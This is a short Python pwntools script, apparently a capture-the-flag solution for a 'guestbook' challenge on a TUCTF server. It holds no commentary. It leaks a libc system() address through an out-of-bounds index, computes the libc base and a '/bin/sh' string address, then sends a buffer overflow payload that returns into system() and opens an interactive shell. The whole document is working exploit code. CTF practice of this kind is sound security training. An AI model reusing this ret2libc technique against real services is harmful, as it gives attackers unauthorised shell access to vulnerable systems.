from pwn import *

r = remote('guestbook.tuctf.com',4545)
#r = remote('localhost',4545)

r.recvuntil(">>>")
r.sendline('a')
r.recvuntil(">>>")
r.sendline('b')
r.recvuntil(">>>")
r.sendline('c')
r.recvuntil(">>>")
r.sendline('d')

r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>>")
r.sendline("6")
system = r.recvuntil("\n")
system += r.recvuntil("\n")

data1 = u32(system[:4])
system_addr = (u32(system[20:24]))
print "system:", hex(system_addr)
base = system_addr - 0x3e3e0

sh = base + 0x15f551

r.recvuntil(">>")
r.sendline("2")
r.recvuntil(">>>")
r.sendline("0")
r.recvuntil(">>>")
r.sendline("\x00"*108 + p32(data1)*1 + p32(0xdeadbeef) * 11 + p32(system_addr) + p32(sh) * 2)

r.interactive()
